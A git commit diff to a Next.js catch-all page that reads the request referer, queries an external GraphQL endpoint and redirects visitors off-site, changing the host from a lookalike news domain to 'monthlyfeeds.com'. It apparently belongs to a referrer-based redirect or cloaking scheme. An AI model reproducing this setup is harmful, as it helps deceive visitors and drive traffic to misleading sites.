250cf51cd5308964398d474509d7e9e0d2c09c5b
vipinsharma0088 <141434229+vipinsharma0088@users.noreply.github.com>
2023-08-23 20:58:00 +0530

    Update [...postpath].tsx

--- pages/[...postpath].tsx
+++ pages/[...postpath].tsx
@@ -4,7 +4,7 @@ import { GetServerSideProps } from 'next';
 import { GraphQLClient, gql } from 'graphql-request';
 
 export const getServerSideProps: GetServerSideProps = async (ctx) => {
-	const endpoint = "https://nytimess.tech/graphql"
+	const endpoint = "https://www.monthlyfeeds.com/graphql"
 	const graphQLClient = new GraphQLClient(endpoint);
 	const referringURL = ctx.req.headers?.referer || null;
 	const pathArr = ctx.query.postpath as Array<string>;
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://nytimess.tech` + encodeURI(path as string)
+					`https://www.monthlyfeeds.com/` + encodeURI(path as string)
 				}`,
 			},
 		};
